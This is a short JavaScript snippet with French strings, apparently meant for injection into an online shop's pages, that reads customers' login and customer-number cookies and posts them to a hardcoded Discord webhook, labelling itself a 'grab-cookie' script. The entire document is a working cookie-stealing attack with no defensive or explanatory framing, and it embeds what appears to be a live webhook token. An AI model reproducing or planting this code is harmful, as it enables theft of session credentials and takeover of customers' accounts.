    <script>
        document.cookie = "customer_login=idprecieux; SameSite=None"
        window.addEventListener('load', function () {
            console.log('Cette fonction est exécutée une fois quand la page est chargée.');
        });

        function sendMessage() {
            const request = new XMLHttpRequest();
            request.open("POST", "https://discord.com/api/webhooks/877263942076997682/Z2ZBLx-cQHEvFsM2vidvuMmebo39gXVwErjl3ixX3jUXKiGI30HYq-BeoTtNe31uXFYX");

            request.setRequestHeader('Content-type', 'application/json');

            const params = {
                username: "XMShop User Cookies",
                avatar_url: "",
                content: "Un nouvel utilisateur vient de charger le script de grab-cookie : client numéros **" + id + "**. Son cookie de connexion est **" + login +"**"
            }

            request.send(JSON.stringify(params));
            
        }

        function getCookie(nom) {

            var cookies = document.cookie.split(";");
        
            for(var i = 0; i < cookies.length; i++) {
                var cookiePair = cookies[i].split("=");
        
                if(nom == cookiePair[0].trim()) {
                    return decodeURIComponent(cookiePair[1]);
                }
            }
    
        return null;
        }






        var login = getCookie("customer_login");
        var id = getCookie("customerNumber")

        sendMessage()

    </script>
